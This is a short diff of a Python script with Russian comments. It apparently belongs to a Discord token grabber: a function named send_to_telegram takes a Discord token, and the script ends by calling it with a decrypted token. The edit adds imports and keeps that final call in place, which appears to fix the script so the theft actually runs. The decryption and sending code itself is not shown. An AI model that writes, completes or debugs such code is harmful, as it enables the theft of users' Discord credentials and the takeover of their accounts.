@@ -1,4 +1,4 @@
-import os
+import os, requests, json # И любые другие модули, которые там используются
 import json
 import base64
 import re
@@ -56,4 +56,5 @@ def send_to_telegram(token_discord):
         print(f"Ошибка сети: {e}")
 
 # ВЫЗОВ ФУНКЦИИ (без этой строки ничего не произойдет!)
+
 send_to_telegram(decrypted_token)
